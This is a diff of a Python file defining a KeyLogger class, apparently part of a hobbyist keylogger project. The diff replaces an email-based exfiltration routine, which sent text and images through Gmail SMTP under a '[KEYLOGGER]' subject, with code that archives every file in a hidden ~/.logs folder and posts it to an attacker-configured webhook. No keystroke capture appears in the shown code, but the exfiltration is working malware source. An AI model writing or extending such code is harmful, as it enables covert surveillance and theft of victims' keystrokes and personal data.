@@ -1,59 +1,65 @@
-"""
-- Use logging instead of print() so you can turn off all at once
-"""
-from dotenv import dotenv_values
+from dotenv import dotenv_values # dont forget to replace this to argparse 
 from datetime import datetime
-from email.message import EmailMessage
-import imghdr
-import smtplib
-import ssl
-import time
+import requests
+import logging
+import gzip
+import shutil
+import os
+import tarfile
+
 
 class KeyLogger:
-    def __init__(self, sender_email, password, receiver_email):
-        self.sender_email = sender_email
-        self.password = password
-        self.receiver_email = receiver_email
+    def __init__(self, webhook_url, logs_dir):
+        self.url = webhook_url
+        self.logs_dir = logs_dir
         self.interval = 30 # in seconds
+    
 
-    def send_mail(self, text_data, img_data):
-        port = 465  # For SSL
-        context = ssl.create_default_context() # Create a secure SSL context
+    """Compress all file in the specified directory `logs_dir`"""
+    def compress_files(self):
+        os.chdir(self.logs_dir)
 
-        with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
-            now = datetime.now().strftime("%H:%M:%S %d/%m/%Y ")
-            
-            # configure email headers
-            message = EmailMessage()
-            message['Subject'] = f"[KEYLOGGER]: {now}"
-            message['From'] = self.sender_email
-            message['To'] = self.receiver_email
+        # combine all files into one tar file
+        now = datetime.now().strftime("%H%M%S_%d-%m-%Y") # get current time and date
+        tar_file = now + ".tar"
+        with tarfile.open(tar_file, "w") as tar:
+            for path in os.scandir(self.logs_dir): # locate all files in the log directory
+                tar.add(path.name)
 
-            message.set_content(text_data)
-            message.add_attachment(img_data, maintype='image', subtype=imghdr.what(None, img_data))
+        # compress the tar file with gzip
+        gzip_file = tar_file + ".gz"
+        with open(tar_file, 'rb') as f_in:
+            with gzip.open(gzip_file, 'wb') as f_out:
+                shutil.copyfileobj(f_in, f_out)
 
-            print("[*] Logging...")
-            server.login(self.sender_email, self.password)
-            print("[*] Logged in...")
-            server.send_message(message)
-            print("[+] Message is sent!")
+        logging.info("Compression completed!")
+        return gzip_file
+
+
+    """Send the log file with webhook"""
+    def send_log(self):  
+        filename = self.compress_files()
+
+        with open(filename, 'rb') as file:
+            compressed_data = file.read()
+
+        result = requests.post(self.url, files={filename: compressed_data})
+        logging.info("Send completed! ")
 
 
 def main():
+    logging.basicConfig(level=logging.INFO)
+    #logging.disable(logging.INFO)
+
     # get environment variables
     config = dotenv_values(".env")
-    sender_email = config['MY_EMAIL']
-    password = config['APP_PASS']
-    receiver_email = config['TARGET_EMAIL']
+    WEBHOOK_URL = config['WEBHOOK_URL']
     
     # initialize keylogger object
-    keylogger = KeyLogger(sender_email, password, receiver_email)
+    logs_dir = os.path.join(os.path.expanduser("~"), ".logs") # [!] dont forget to make the log folder
+    keylogger = KeyLogger(WEBHOOK_URL, logs_dir)
+    keylogger.send_log()
 
-    with open('image.jpg', 'rb') as file:
-        image_data = file.read()
-
-    keylogger.send_mail("test subject", image_data)
-    
 
 if __name__ == "__main__":
     main()
